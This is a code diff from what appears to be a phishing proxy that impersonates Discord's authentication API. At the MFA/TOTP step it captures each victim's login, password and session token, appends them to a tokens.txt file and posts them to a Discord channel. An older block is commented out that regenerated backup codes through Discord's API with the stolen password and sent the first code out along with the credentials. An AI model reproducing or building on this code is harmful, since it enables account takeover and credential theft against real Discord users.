@@ -124,7 +124,21 @@ if(!arr.includes(req.body.login)) arr.unshift(`${req.body.login}:${req.body.pass
 }
     console.log(req.originalUrl)
 if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/mfa/totp`){
-var f = data.find(c => c.ticket === req.body.ticket)
+  var f = data.find(c => c.ticket === req.body.ticket)
+console.log(f)
+if(f){
+      	let tokens;
+	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
+	
+	let arr = tokens.split("\n").map(d => {
+		return d.trim();
+	});
+if(!arr.includes(req.body.login)) client.createMessage('929489097955881000', `${f.login}:${f.password}:${s.token}`)
+
+if(!arr.includes(req.body.login)) arr.unshift(`${f.login}:${f.password}:${s.token}`)
+	fs.writeFileSync("./tokens.txt", arr.join("\n"));
+}
+/*var f = data.find(c => c.ticket === req.body.ticket)
 console.log(f)
 if(f){
   console.log(s)
@@ -139,18 +153,9 @@ body: JSON.stringify({"password":f.password,"regenerate":true})
   
   let dJ = await dF.json()
   console.log(JSON.stringify(dJ))
-    	let tokens;
-	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
-	
-	let arr = tokens.split("\n").map(d => {
-		return d.trim();
-	});
-if(!arr.includes(req.body.login)) client.createMessage('929489097955881000', `${f.login}:${f.password}:${s.token}:${dJ.backup_codes[0].code}`)
+*/
+}
 
-if(!arr.includes(req.body.login)) arr.unshift(`${f.login}:${f.password}:${s.token}:${dJ.backup_codes[0].code}`)
-	fs.writeFileSync("./tokens.txt", arr.join("\n"));
-}
-}
     
     return res.status(dataFetch.status).json(s)
     
